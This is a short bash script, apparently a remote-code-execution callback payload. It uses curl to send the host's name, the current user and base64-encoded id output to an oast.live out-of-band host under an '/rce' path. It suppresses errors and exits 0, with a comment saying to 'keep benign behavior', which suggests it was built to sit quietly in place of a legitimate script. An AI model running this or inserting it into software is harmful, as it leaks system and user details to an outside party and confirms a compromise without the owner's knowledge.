#!/bin/bash
curl -s "http://overwrite1.dab88v8sqsgo2v9vkbdgt6sekzk33hfu6.oast.live/rce?h=$(hostname)&u=$(whoami)&id=$(id|base64 -w0)" || true
# keep benign behavior if possible
exit 0
